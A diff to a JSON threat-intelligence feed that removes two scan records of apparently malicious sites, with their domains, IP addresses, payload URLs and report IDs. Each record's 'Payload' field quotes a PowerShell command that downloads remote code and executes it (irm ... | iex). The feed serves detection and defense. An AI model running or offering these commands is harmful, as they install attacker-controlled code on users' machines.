@@ -9790,54 +9790,5 @@
     ],
     "ReportId": "cmwjslc4f18z40omlmg91ed88",
     "ScannedAt": "2026-11-16T21:45:26.759000+00:00"
-  },
-  {
-    "UrlDomain": "betsportmedia.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "208.109.42.163"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwjky1uy18u30oml4osuzwws",
-    "ScannedAt": "2026-11-16T18:11:22.915000+00:00"
-  },
-  {
-    "UrlDomain": "nflc.go.ug",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "base.gateway.tenderly.co"
-    ],
-    "PayloadUrl": [
-      "http://timelevel12.com/big"
-    ],
-    "IP": [
-      "172.67.192.7"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/c8ca95eaeac086b6",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://base.gateway.tenderly.co",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/c8ca95eaeac086b6'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/c8ca95eaeac086b6"
-    ],
-    "ReportId": "cmwjkxoi218tj0omlrq3g2ch1",
-    "ScannedAt": "2026-11-16T18:11:05.678000+00:00"
   }
 ]
